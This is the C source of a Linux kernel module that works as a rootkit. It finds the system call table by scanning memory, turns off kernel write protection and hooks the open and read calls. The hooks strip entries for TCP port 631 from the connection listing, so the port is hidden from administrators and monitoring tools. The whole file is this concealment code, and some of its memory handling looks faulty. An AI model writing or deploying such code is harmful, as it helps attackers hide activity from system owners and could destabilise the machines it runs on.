#define _GNU_SOURCE
#include <asm/cacheflush.h>
#include <asm/current.h>
#include <asm/page.h>
#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/stat.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/unistd.h>
MODULE_LICENSE("GPL");

#define BUF_SIZE 1024
#define END_MEM  ULLONG_MAX
#define START_MEM   PAGE_OFFSET
#define TCP_LINE_SIZE 150
#define PORT_TO_HIDE 631

bool hijack;
int current_port_index;
unsigned long *syscall_table;

// original functions
asmlinkage int (*original_open)(const char *, int);
asmlinkage long (*original_read)(int, char __user *, size_t);

// hijacked open function
asmlinkage int new_open(const char* path_name, int flags) {
  // sets the hijack flag indicating that we should hide the TCP port
  if (strstr(path_name, "tcp") != NULL && strstr(path_name, "tcp6") == NULL) {
    printk("path name is: %s \n", path_name);
    hijack = true;
  }
  return (*original_open)(path_name, flags);
}

// hijacked read function
asmlinkage long new_read(int fd, char __user *buf, size_t count) {
  long ret;
  ret = original_read(fd, buf, count);
  if (!hijack)
    return ret;
  char * kernel_buf = kmalloc(count, GFP_KERNEL);
  // Kernel Problem
  if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
    printk("FAILLLLLLED KERNEL PROBLEM");
    return ret;
  }
  long i = 0;
  // ignoring the first line of the file
  i += TCP_LINE_SIZE;

  bool in_splitter = false;
  int current_port = 0;
  int spaces = 0, characters = 0;
  for (; i < ret; i = i + TCP_LINE_SIZE) {
    int j = 0;
    int val = 0;
    for (; j < 4; j++) {
      if (kernel_buf[i + 15 + j] <= 57)
        val = val + (kernel_buf[i + 15 + j] - 48) * (1 << (4 * (3 - j)));
      else
        val = val + (kernel_buf[i + 15 + j] - 55) * (1 << (4 * (3 - j)));
    }
    if (val != PORT_TO_HIDE)
      continue;
    long temp = i;
    for (; temp < ret - 150; temp++) {
      kernel_buf[temp] = kernel_buf[temp + 150];
    }
    for (temp = ret - (TCP_LINE_SIZE + 1); temp < ret; temp++) {
      kernel_buf[temp] = '\0';
    }
    count = count - TCP_LINE_SIZE;
  }
  hijack = false;
  // Kernel Problem
  if (copy_to_user(buf, kernel_buf, count)) {
    printk("FAILLLLLLED KERNEL PROBLEM");
  }
  kfree(kernel_buf);
  return ret;
}

unsigned long **find(void) {
  unsigned long **sctable;
  unsigned long int i = START_MEM;
  while ( i < END_MEM) {
    sctable = (unsigned long **)i;
    if ( sctable[__NR_close] == (unsigned long *) sys_close) {
      return &sctable[0];
    }
    i += sizeof(void *);
  }
  return NULL;
}

void disable_write_protection(void) {
  write_cr0 (read_cr0 () & (~ 0x10000));
  return;
}

void enable_write_protection(void) {
  write_cr0 (read_cr0 () | 0x10000);
  return;
}

static int init(void) {
  printk("\nModule starting...\n");
  syscall_table = (unsigned long *) find();
  current_port_index = 0;
  if ( syscall_table != NULL ) {
    //printk("Syscall table found at %llx\n", (unsigned long ) syscall_table);
  } else {
    //printk("Syscall table not found!\n");
  }
  original_read = (void *)syscall_table[__NR_read];
  original_open = (void *)syscall_table[__NR_open];
  disable_write_protection();
  syscall_table[__NR_open] = new_open;
  syscall_table[__NR_read] = new_read;
  enable_write_protection();
  return 0;
}

static void exit_(void) {
  disable_write_protection();
  syscall_table[__NR_open] = original_open;
  syscall_table[__NR_read] = original_read;
  enable_write_protection();
  printk("Module ending\n");
  return;
}

module_init(init);
module_exit(exit_);
